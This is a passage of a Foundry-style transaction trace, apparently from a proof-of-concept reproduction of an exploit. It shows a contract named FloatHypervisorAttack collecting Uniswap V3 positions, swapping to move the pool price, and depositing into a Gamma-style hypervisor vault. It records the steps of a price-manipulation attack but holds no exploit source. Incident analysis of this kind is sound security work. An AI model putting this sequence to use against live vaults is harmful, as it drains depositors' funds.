+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000018358ae90f35cfe966e → 0x0000000000000000000000000000000000000000000004724bca9d868171bb1f
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x000000000000000000000000000000000000000000004de3d4f68df2ccdd0ae1 → 0x000000000000000000000000000000000000000000004af4e1da815fa869e630
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 585678802171304264 [5.856e17])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 585678802171304264 [5.856e17])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x0000000000000000000000000000000000000000000000009a0a3e32eafdd0a2 → 0x00000000000000000000000000000000000000000000000091e97e6e6f18375a
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x0000000000000000000000000000000000000000000000212adbe988645fb10e → 0x00000000000000000000000000000000000000000000002132fca94ce0454a56
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -887220 [-8.872e5], tickUpper: 887220 [8.872e5], amount0: 13852575945758839350449 [1.385e22], amount1: 585678802171304264 [5.856e17])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x5935eda6ed16c68661381eaa7c225e7488300f2a8a3e7a867ca0642d36d24818: 0x00000000000000000a7c8bb4695a7e4f0000000000000304fc9b7238cf1cfcb8 → 0x0000000000000000025bcbefed74e5070000000000000016097f65a5aaa9d807
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000002eef31c0c93247324b10000000000000000000000000000000000000000000000000820bfc47be59948
+    │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0xed2333d38121452740eb1ba5b5fdfa061273e293036ec233e5071f8714bb64c9) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000047a0d234f098751c000000000000000000000000000000010d14291d583dd108424f02ad02a8beee00000000000000000000000000000000001e953e57a9395fde6974f4b4ca7dff0000000000000000000000000000000000000000000000007bf7d74d7986f4ce000000000000000000000000000000000000000000000000000722ee628bb66e
+    │   │   │   │   │   │   ├─ [25033] UniV3Pool::burn(-887220 [-8.872e5], -77220 [-7.722e4], 5125615444132526559 [5.125e18])
+    │   │   │   │   │   │   │   ├─ emit Burn(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], tickLower: -887220 [-8.872e5], tickUpper: -77220 [-7.722e4], amount: 5125615444132526559 [5.125e18], amount0: 544796324702262503849 [5.447e20], amount1: 33328095915659867 [3.332e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000003dc185094760a7fff9 → 0x00000000000000000000000000000000000000000000003d7a63313065e1861a
+    │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc09: 0x0000000000000000000722ee628bb66e00000000000000007bf7d74d7986f4ce → 0x0000000000000000007d8aa868a388c9000000000000001e0489322a2a409e77
+    │   │   │   │   │   │   │   │   @ 0x7f16e4ac80e3195175c78aa64fe305d939ea0f7e52dc9181b922712fa7117c19: 0x000000000000003dc185094760a7fff9000000000000003dc185094760a7fff9 → 0x000000000000003d7a63313065e1861a000000000000003d7a63313065e1861a
+    │   │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b0: 0xffffffffffffffffb85f2dcb0f678ae4000000000000000047a0d234f098751c → 0xffffffffffffffffff8105e20a2e04c30000000000000000007efa1df5d1fb3d
+    │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc06: 0x00000000000000000000000000000000000000000000000047a0d234f098751c → 0x000000000000000000000000000000000000000000000000007efa1df5d1fb3d
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001d88915adcb0b9a9a9000000000000000000000000000000000000000000000000007667ba0617d25b
+    │   │   │   │   │   │   ├─ [14836] UniV3Pool::collect(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], -887220 [-8.872e5], -77220 [-7.722e4], 544796324702262503849 [5.447e20], 33328095915659867 [3.332e16])
+    │   │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 544796324702262503849 [5.447e20])
+    │   │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 544796324702262503849 [5.447e20]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 544796324702262503849 [5.447e20])
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x000000000000000000000000000000000000000000004af4e1da815fa869e630 → 0x000000000000000000000000000000000000000000004ad759492682f7b03c87
+    │   │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x0000000000000000000000000000000000000000000004724bca9d868171bb1f → 0x00000000000000000000000000000000000000000000048fd45bf863322b64c8
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 33328095915659867 [3.332e16])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 33328095915659867 [3.332e16])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x00000000000000000000000000000000000000000000000091e97e6e6f18375a → 0x000000000000000000000000000000000000000000000000917316b4690064ff
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000002132fca94ce0454a56 → 0x00000000000000000000000000000000000000000000002133731106e65d1cb1
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Collect(owner: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], tickLower: -887220 [-8.872e5], tickUpper: -77220 [-7.722e4], amount0: 544796324702262503849 [5.447e20], amount1: 33328095915659867 [3.332e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x76a039fd0b70a7736511e79e69ab7b0edae1ec29ea9bc08c9d2778da09a5cc09: 0x0000000000000000007d8aa868a388c9000000000000001e0489322a2a409e77 → 0x0000000000000000000722ee628bb66e00000000000000007bf7d74d7986f4ce
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001d88915adcb0b9a9a9000000000000000000000000000000000000000000000000007667ba0617d25b
+    │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 36279037816225215491878 [3.627e22]
+    │   │   │   │   │   │   │   └─ ← [Return] 36279037816225215491878 [3.627e22]
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 400000000000000000000 [4e20]
+    │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 36027816294910082092874 [3.602e22])
+    │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 36027816294910082092874 [3.602e22]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 36027816294910082092874 [3.602e22])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x00000000000000000000000000000000000000000000048fd45bf863322b64c8 → 0x000000000000000000000000000000000000000000000c30e6bfbd0e7b9e7412
+    │   │   │   │   │   │   │   │   │   @ 0x9617c035d2c1fd8a16f6c18f78c25f392a246ef1713d0b0f48b7e431245e8b3d: 0x0000000000000000000000000000000000000000000007aeb0c9e746cb332f26 → 0x00000000000000000000000000000000000000000000000d9e66229b81c01fdc
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [3262] WETH9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 397230119248611619806 [3.972e20])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: HypervisorB: [0xc86B1e7FA86834CaC1468937cdd53ba3cCbC1153], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 397230119248611619806 [3.972e20])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x00000000000000000000000000000000000000000000002133731106e65d1cb1 → 0x000000000000000000000000000000000000000000000036bc1ff1de41ead08f
+    │   │   │   │   │   │   │   │   @ 0x2b8a864f9f2112a9074fd12f453b8d016c0fcff25857ae548779e19ac6df1bd1: 0x000000000000000000000000000000000000000000000015af1d78b58c400000 → 0x000000000000000000000000000000000000000000000000267097de30b24c22
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x0000000000000000000000000000000000000000, amount: 3703209972128726462535 [3.703e21])
+    │   │   │   │   │   │   ├─ emit Withdraw(param0: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param1: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], param2: 3703209972128726462535 [3.703e21], param3: 50425188565371183947172 [5.042e22], param4: 397849126146698583937 [3.978e20])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xf681125939867b53b18ed9e847456377cee007cff53bf8cca400f655f93a8ef1: 0x0000000000000000000000000000000000000000000000c8c05cb93428f53047 → 0
+    │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000ca26b8738259fcfa8c → 0x000000000000000000000000000000000000000000000001665bba4e3107ca45
+    │   │   │   │   │   │   └─ ← [Return] 50425188565371183947172 [5.042e22], 397849126146698583937 [3.978e20]
+    │   │   │   │   │   ├─ [287157] UniV3Pool::swap(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], false, 250000000000000000000 [2.5e20], 1461446703485210103287273052203988822378723970340 [1.461e48], 0x)
+    │   │   │   │   │   │   ├─ [4249] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 337465086971173970599147 [3.374e23])
+    │   │   │   │   │   │   │   ├─ [3503] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transfer(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 337465086971173970599147 [3.374e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], to: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount: 337465086971173970599147 [3.374e23])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xb65a6fcba7239a6c772fa71308ae3f27965827fb0aa7332845b0a66e1591e5d0: 0x000000000000000000000000000000000000000000004ad759492682f7b03c87 → 0x000000000000000000000000000000000000000000000361546a8ce37034df9c
+    │   │   │   │   │   │   │   │   │   @ 0xd35634445c21081b6231fbb6f87a6c0d5d6915420c7de17b1d2314747ba0c411: 0x000000000000000000000000000000000000000000000c30e6bfbd0e7b9e7412 → 0x0000000000000000000000000000000000000000000053a6eb9e56ae0319d0fd
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10480745721932834047 [1.048e19]
+    │   │   │   │   │   │   ├─ [5006] FloatHypervisorAttack::uniswapV3SwapCallback(-337465086971173970599147 [-3.374e23], 250000000000000000000 [2.5e20], 0x)
+    │   │   │   │   │   │   │   ├─ [3262] WETH9::transfer(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], 250000000000000000000 [2.5e20])
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac], amount: 250000000000000000000 [2.5e20])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x9031422fc3fbc7622aedfe596196caaf063492dbb4e24d20943416d18a9e85c7: 0x000000000000000000000000000000000000000000000036bc1ff1de41ead08f → 0x0000000000000000000000000000000000000000000000292ead866cca42d08f
+    │   │   │   │   │   │   │   │   │   @ 0xe9e9ba455ec68cee0ae4017c153a91862b7360ef23874bd041366bd0dde96c36: 0x000000000000000000000000000000000000000000000000917316b4690064ff → 0x00000000000000000000000000000000000000000000000e1ee58225e0a864ff
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(UniV3Pool: [0xE8c2030686fC3b0161Ee1def0E8d01dFe4FAc0Ac]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 260480745721932834047 [2.604e20]
+    │   │   │   │   │   │   ├─ emit Swap(sender: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], recipient: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], amount0: -337465086971173970599147 [-3.374e23], amount1: 250000000000000000000 [2.5e20], sqrtPriceX96: 9717289556453943660274485210 [9.717e27], liquidity: 1134034594221890964189 [1.134e21], tick: -41971 [-4.197e4])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deb2: 0x01063d9e460000000000000000001bde5e85cd898bc0c37e74fff8c8efd1331d → 0x016457ac7d00000000000000000053c3bd69fa46ae0d617424fffb7a0f327b9a
+    │   │   │   │   │   │   │   @ 0x401d552da1477f668c4f3446d4dc6f410fa6330ddf2a63b199e7792003dac92d: 0 → 0x00000000000000000000000000000000003938c1d9ce45afe573f1cd3a422255
+    │   │   │   │   │   │   │   @ 0x401d552da1477f668c4f3446d4dc6f410fa6330ddf2a63b199e7792003dac92e: 0x0100000000000000000000000000000000000000000000000000000000000000 → 0x016a954ac30000000000000000006fa21befc7d039ce24f298fff442ff03aeb7
+    │   │   │   │   │   │   │   @ 3: 0x00000000000000000000000000000001000000000000000833f485b7b2e9f959 → 0x000000000000000001bc16d674ec7ffd000000000000000833f485b7b2e9f959
+    │   │   │   │   │   │   │   @ 0x87e69dba913e8be313bce33a9b6d74289e6b961e17da64489f5189610ee4c554: 0 → 0x00000000000000000000000000000001acdc1ba0f82ff253bdb24e7ee51934cf
+    │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36452: 0x0000000000000000000000000000000065e7590363320ad10996e4f823e45396 → 0x0000000000000000000000000000000146f4c29d94fde782b41b6986c134e139
+    │   │   │   │   │   │   │   @ 0x87e69dba913e8be313bce33a9b6d74289e6b961e17da64489f5189610ee4c555: 0 → 0x000000000000000000000000000000000038b65d95626a8b5846d6ae98c2cc4d
+    │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb456: 0x010909140e000000000000000000239860b326eebee9e3b6dbfff5489eaeb325 → 0x01618c36b50000000000000000004c09bb3ca0e17ae4413bbdfffefa6054fb92
+    │   │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000003d7a63313065e1861a → 0x00000000000000000000000000000000000000000000003d79e43712700f8add
+    │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b1: 0x0000000000000000000000000000000071a7e1d7b6c7ac23cf128ed668ea0829 → 0x000000000000000000000000000000013b3439c94168462fee9fbfa87c2f2ca6
+    │   │   │   │   │   │   │   @ 0: 0x000166004c004c004bfe7692000000000000000001aa21dbcd4db719b52ed5fd → 0x000166004c004c004bff5c0d00000000000000001f65f41a638f2d9a8f8387da
+    │   │   │   │   │   │   │   @ 0xc06a0b06e22e21c202c6bebfc53a8c25d6f75320148af12fb76fab4475ee89ad: 0x000000000000000000000000000000015d775a4352005c7f22914afe9ac7ef43 → 0x000000000000000000000000000000004f64c15da62f95d49b2103804a51458c
+    │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b3: 0x0102237e68000000000000000000011fa81e902e97587e09c6fffd8781153d8c → 0x016871cc5b0000000000000000006e8273d137a1a275a6e8d2fff6bb7dee712b
+    │   │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000033f7d5af05aad1e16a508683712a81 → 0x0000000000000000000000000000000000470e0f19b3aa3800f8b94cdae9d835
+    │   │   │   │   │   │   │   @ 0xfee3245e2c1c9b7760f82f3ca09b133e8493299737d551b7edab3caca06d23b2: 0x00000000000000000000000000000000000fb3648dcd8b41c05611920dcb6055 → 0x000000000000000000000000000000000026a87f205b358ba874621a9e227797
+    │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deb1: 0x00000000000000000000000000000000002e8044f0b9f8acdeab74311ec0ebc2 → 0x0000000000000000000000000000000000076044cf0e7add3d89f07348082fd4
+    │   │   │   │   │   │   │   @ 0xe10f5ddc36b528508d2db6488cd7ecf9a5d1df5a09e298fd321bcdadcd4bae30: 0x00000000000000000000000000000000a9d72ee6a18cc2c72fe56f0164b1255b → 0x000000000000000000000000000000010304ecba56a32f8c8dccdf7d80680f74
+    │   │   │   │   │   │   │   @ 0xe10f5ddc36b528508d2db6488cd7ecf9a5d1df5a09e298fd321bcdadcd4bae32: 0x010479d94a00000000000000000002520817b236da36a32952fffad48f49b295 → 0x01661b71790000000000000000006d5013d815995f9781c946fff96e6fb9fc22
+    │   │   │   │   │   │   │   @ 0xed11548b4f9ab28a0cfdd94c0786cf77fb76a7c25e7d733b3760efbb4349deb0: 0x000000000000000000000000000000012d57ac2318944f30b76429a6c92ad39b → 0x000000000000000000000000000000007f846f7ddf9ba323064e24d81bee6134
+    │   │   │   │   │   │   │   @ 0xc06a0b06e22e21c202c6bebfc53a8c25d6f75320148af12fb76fab4475ee89ae: 0x000000000000000000000000000000000032c9eb71eb6b8f24de5e145431d18f → 0x000000000000000000000000000000000002db503f6a7c28d82cb5b7487aeefc
+    │   │   │   │   │   │   │   @ 0xc06a0b06e22e21c202c6bebfc53a8c25d6f75320148af12fb76fab4475ee89af: 0x01082ec9550000000000000000006ab2c4b8b939918d9f3fb0fff67340537a67 → 0x016266816e00000000000000000004ef57370e96a84085b2e8fffdcfbeb03450
+    │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb454: 0x0000000000000000000000000000000159b5924439e04ddeb231b96c8b1910ad → 0x000000000000000000000000000000005326895cbe4fa4750b8095125a002422
+    │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36454: 0x01014d2fdf00000000000000000000b62b7d3c3321de95d059fffe91d23ffe41 → 0x0169481ae40000000000000000006eebf0728b9d17ef8f223ffff5b12cc3b076
+    │   │   │   │   │   │   │   @ 0x7f1ce1e079f1ca7930a763968f41bf5c05902f148e14ba7cd3c35bdda46eb455: 0x0000000000000000000000000000000000308cae5f120079cf66b2d94e564b99 → 0x0000000000000000000000000000000000048291ef62d256ac7f2c40f58f4cf1
+    │   │   │   │   │   │   │   @ 0xe10f5ddc36b528508d2db6488cd7ecf9a5d1df5a09e298fd321bcdadcd4bae31: 0x000000000000000000000000000000000015fe0241c49d26d85dfa4e07e268cf → 0x0000000000000000000000000000000000201417e487326579a5e4cdeba23090
+    │   │   │   │   │   │   │   @ 0xf730f8ec40d52d43793ecf9f61048727f9b52c5975088dea11f80e8e29c36453: 0x000000000000000000000000000000000015158297ef3ce766a91f8d1487a1dc → 0x000000000000000000000000000000000021eb86c62aee54cd1bc3fb8da64f65
+    │   │   │   │   │   │   │   @ 0x87e69dba913e8be313bce33a9b6d74289e6b961e17da64489f5189610ee4c556: 0x0100000000000000000000000000000000000000000000000000000000000000 → 0x016a954ac30000000000000000006fa21befc7d039ce24f298fff442ff03aeb7
+    │   │   │   │   │   │   │   @ 0x401d552da1477f668c4f3446d4dc6f410fa6330ddf2a63b199e7792003dac92c: 0 → 0x00000000000000000000000000000001acdc1ba0f82ff253bdb24e7ee51934cf
+    │   │   │   │   │   │   └─ ← [Return] -337465086971173970599147 [-3.374e23], 250000000000000000000 [2.5e20]
+    │   │   │   │   │   ├─ [156922] 0x3803729416AA5207FE801C1C565B906F6f3f8a28::deposit(395035555697366947975421 [3.95e23], 0, FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab])
+    │   │   │   │   │   │   ├─ [16062] HypervisorA::getTotalAmounts() [staticcall]
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x9d62f3500fc46f30b4e140a0d1e4ee973b02f867c846b2a0bcfa7ceb93aa2f2e) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000d247d62e6caf200000000000000000000000000000000f3ce3940d6ae430da89ad4746734bd1700000000000000000000000000000000001b772bc722c39268bd934c39cea9bd00000000000000000000000000000000000000000000000005d62a8fe7c6df280000000000000000000000000000000000000000000000000000bd69db7bb288
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1013] UniV3Pool::positions(0x2e657dd52d4771276fda26c132e4a24e95088e6e041f1ef13e04a804eaaf0072) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000001a87c203df2c2f000000000000000000000000000000002c5de621214bfeadfacd8fc5c1ee3d120000000000000000000000000000000000020c696e5807ccf0bb3ea82f955fd700000000000000000000000000000000000000000000000002115937abba4184000000000000000000000000000000000000000000000000000019090cada3e8
+    │   │   │   │   │   │   │   ├─ [696] UniV3Pool::slot0() [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000001f65f41a638f2d9a8f8387daffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff5c0d000000000000000000000000000000000000000000000000000000000000004b000000000000000000000000000000000000000000000000000000000000004c000000000000000000000000000000000000000000000000000000000000004c00000000000000000000000000000000000000000000000000000000000000660000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   ├─ [1207] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [464] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 65971014380412205945 [6.597e19]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 65971014380412205945 [6.597e19]
+    │   │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(HypervisorA: [0x85CBeD523459b7f6F81C11e710DF969703a8A70C]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1852640740575343104 [1.852e18]
+    │   │   │   │   │   │   │   └─ ← [Return] 66540583151494306853 [6.654e19], 1852957451630873265 [1.852e18]
+    │   │   │   │   │   │   ├─ [389] HypervisorA::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2064504523257148120 [2.064e18]
+    │   │   │   │   │   │   ├─ [428] HypervisorA::token0() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9
+    │   │   │   │   │   │   ├─ [26762] 0xb05097849BCA421A3f51B249BA6CCa4aF4b97cb9::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x3803729416AA5207FE801C1C565B906F6f3f8a28, 395035555697366947975421 [3.95e23])
+    │   │   │   │   │   │   │   ├─ [26010] 0x4bc57F8E4A53Ed244a9677D0170F8A7Fe4c2f08e::transferFrom(FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], 0x3803729416AA5207FE801C1C565B906F6f3f8a28, 395035555697366947975421 [3.95e23]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], to: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 395035555697366947975421 [3.95e23])
+    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: FloatHypervisorAttack: [0x05303c95Ee7fF76daf1421b28E024635D7Fe51ab], spender: 0x3803729416AA5207FE801C1C565B906F6f3f8a28, amount: 115792089237316195423570985008687907853269984665640563642422028310546181664514 [1.157e77])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xd2a7dd510741a504147a01ed6e1711945381e597349bac81e11d0dc50ab19295: 0xffffffffffffffffffffffffffffffffffffffffffffff93946ca47442bfffff → 0xffffffffffffffffffffffffffffffffffffffffffffabeca8ce4dc63fa62f02
